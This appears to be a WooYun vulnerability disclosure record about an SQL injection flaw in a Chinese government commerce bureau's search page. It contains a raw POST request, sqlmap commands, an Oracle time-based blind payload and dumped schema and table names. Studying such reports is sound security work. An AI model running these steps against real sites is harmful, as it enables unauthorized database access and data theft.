{"id": 63932, "wybug_id": "wooyun-2013-028364", "wybug_title": "某工商管理局搜索页面存在SQL注入漏洞", "wybug_corp": "某工商管理局", "wybug_author": "felixk3y", "wybug_date": "2013-07-10 09:10", "wybug_open_date": "2013-08-24 09:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["工商管理局"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-24：\t细节向公众公开  简要描述： 某工商管理局搜索页面存在SQL注入漏洞 详细说明：  注入类型：POST注入页面：http://www.cdgs.gov.cn/go/mhwz/sreach/sreach_list.go   漏洞证明：  将如下内容保持为 data.txt\nPOST /go/mhwz/sreach/sreach_list.go HTTP/1.1Content-Length: 107Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.cdgs.gov.cn/Cookie: JSESSIONID=186A0342A9D98BE5DBF8C69229BFDB9D; _gscu_914375066=67112861fnwm6x15; _gscs_914375066=671128612b77ox15|pv:1; _gscbrs_914375066=1; gs_tc=; nowskin=6Host: www.cdgs.gov.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Accept: */*author=1&end_date=1&order=0&sreach_type=0&start_date=01%2f01%2f1967&title=Mr.&web_id=20\n其中post参数end_date存在注入。直接用sqlmap：sqlmap.py -r data.txt -p end_date结果如下：\nPlace: POSTParameter: end_date    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: author=1&end_date=1' AND 5701=DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(73)||CHR(106)||CHR(85),5) AND 'Bznk'='Bznk&order=0&sreach_type=0&start_date=01/01/1967&title=Mr.&web_id=20---[08:56:14] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle\nsqlmap.py -r data.txt -p end_date --current-db结果如下：\nweb application technology: JSPback-end DBMS: Oracle[08:57:29] [INFO] fetching current database[08:57:29] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[08:57:29] [INFO] read from file 'D:\\TOOLS\\????\\???????\\sqlmap\\sqlmap1.0\\output\\www.cdgs.gov.cn\\session': WZ]DBAcurrent schema (equivalent to database on Oracle):    'WZ]DBA'\nsqlmap.py -r data.txt -p end_date --tables -D WZ]DBA结果如下：\nDatabase: WZ]DBA[19 tables]+-------------------------------+| ACT_INFO                      || ActiveDataFeed                || CategoryGroup                 || ChicksPass                    || ClickTrack                    || CountryCodes1                 || CustomNav                     || DataFeedPerformance1          || DataFeedPerformance2          || DataFeedPerformance2_incoming || PRODUTO                       || backenduser                   || db_staff                      || enrollments                   || politics                      || pw_posts                      || pwds                          || spip_types_documents          || userlist                      |+-------------------------------+\n   修复方案：  你懂的   版权声明：转载请注明来源 felixk3y@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-07-14 21:04 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}